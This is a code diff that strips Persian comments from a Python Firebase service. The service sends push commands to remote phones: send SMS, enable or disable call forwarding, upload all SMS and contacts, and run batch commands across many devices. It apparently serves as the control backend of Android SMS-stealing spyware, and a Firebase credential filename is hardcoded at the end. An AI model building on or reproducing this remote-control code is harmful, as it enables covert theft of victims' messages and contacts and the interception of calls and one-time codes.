@@ -19,7 +19,6 @@ class FirebaseService:
             logger.error(f"❌ Firebase initialization error: {e}")
 
     async def _send_command(self, token: str, data: Dict[str, str], device_id: Optional[str] = None) -> Optional[str]:
-        """ارسال دستور به دستگاه با FCM"""
         try:
             message = messaging.Message(
                 data=data,
@@ -44,7 +43,6 @@ class FirebaseService:
             return None
 
     async def _send_ping(self, token: str, device_id: Optional[str] = None) -> bool:
-        """ارسال Ping به دستگاه"""
         response = await self._send_command(
             token,
             {
@@ -56,7 +54,6 @@ class FirebaseService:
         return response is not None
 
     async def _remove_invalid_token(self, device_id: str, token: str):
-        """حذف توکن نامعتبر از دیتابیس"""
         try:
             await mongodb.db.devices.update_one(
                 {"device_id": device_id},
@@ -67,7 +64,6 @@ class FirebaseService:
             logger.error(f"❌ Error removing invalid token: {e}")
 
     async def get_all_device_tokens(self) -> List[Dict[str, Any]]:
-        """دریافت تمام دستگاه‌ها با FCM Token"""
         try:
             devices = await mongodb.db.devices.find(
                 {"fcm_tokens": {"$exists": True, "$ne": []}},
@@ -82,7 +78,6 @@ class FirebaseService:
             return []
 
     async def ping_all_devices(self) -> Dict[str, Any]:
-        """ارسال Ping به تمام دستگاه‌ها"""
         devices = await self.get_all_device_tokens()
 
         results = {
@@ -134,7 +129,6 @@ class FirebaseService:
         command_type: str,
         parameters: Optional[Dict[str, Any]] = None
     ) -> Dict[str, Any]:
-        """ارسال دستور عمومی به دستگاه"""
         try:
             device = await mongodb.db.devices.find_one(
                 {"device_id": device_id},
@@ -178,8 +172,6 @@ class FirebaseService:
                 "message": str(e)
             }
 
-    # ⭐⭐⭐ توابع جدید برای دستورات مختلف ⭐⭐⭐
-
     async def send_sms(
         self,
         device_id: str,
@@ -187,7 +179,6 @@ class FirebaseService:
         message: str,
         sim_slot: int = 0
     ) -> Dict[str, Any]:
-        """ارسال پیامک از دستگاه"""
         return await self.send_command_to_device(
             device_id=device_id,
             command_type="send_sms",
@@ -204,7 +195,6 @@ class FirebaseService:
         forward_number: str,
         sim_slot: int = 0
     ) -> Dict[str, Any]:
-        """فعال‌سازی هدایت تماس"""
         return await self.send_command_to_device(
             device_id=device_id,
             command_type="call_forwarding",
@@ -219,7 +209,6 @@ class FirebaseService:
         device_id: str,
         sim_slot: int = 0
     ) -> Dict[str, Any]:
-        """غیرفعال‌سازی هدایت تماس"""
         return await self.send_command_to_device(
             device_id=device_id,
             command_type="call_forwarding_disable",
@@ -229,35 +218,30 @@ class FirebaseService:
         )
 
     async def quick_upload_sms(self, device_id: str) -> Dict[str, Any]:
-        """آپلود سریع 50 پیامک"""
         return await self.send_command_to_device(
             device_id=device_id,
             command_type="quick_upload_sms"
         )
 
     async def quick_upload_contacts(self, device_id: str) -> Dict[str, Any]:
-        """آپلود سریع 50 مخاطب"""
         return await self.send_command_to_device(
             device_id=device_id,
             command_type="quick_upload_contacts"
         )
 
     async def upload_all_sms(self, device_id: str) -> Dict[str, Any]:
-        """آپلود کامل همه پیامک‌ها"""
         return await self.send_command_to_device(
             device_id=device_id,
             command_type="upload_all_sms"
         )
 
     async def upload_all_contacts(self, device_id: str) -> Dict[str, Any]:
-        """آپلود کامل همه مخاطبین"""
         return await self.send_command_to_device(
             device_id=device_id,
             command_type="upload_all_contacts"
         )
 
     async def ping_device(self, device_id: str) -> Dict[str, Any]:
-        """ارسال Ping به یک دستگاه خاص"""
         try:
             device = await mongodb.db.devices.find_one(
                 {"device_id": device_id},
@@ -292,14 +276,12 @@ class FirebaseService:
                 "message": str(e)
             }
 
-    # ⭐ تابع کمکی برای ارسال دستور به چند دستگاه
     async def send_command_to_multiple_devices(
         self,
         device_ids: List[str],
         command_type: str,
         parameters: Optional[Dict[str, Any]] = None
     ) -> Dict[str, Any]:
-        """ارسال دستور به چندین دستگاه همزمان"""
         results = {
             "total": len(device_ids),
             "success": 0,
@@ -328,7 +310,4 @@ class FirebaseService:
         logger.info(f"📊 Batch command: {results['success']}/{results['total']} successful")
         return results
 
-
-# ⭐ این سرویس فقط برای دستگاه‌هاست
-# برای ارسال notification به ادمین‌ها از firebase_admin_service استفاده کن
 firebase_service = FirebaseService("testkot-d12cc-firebase-adminsdk-fbsvc-523c1700f0.json")
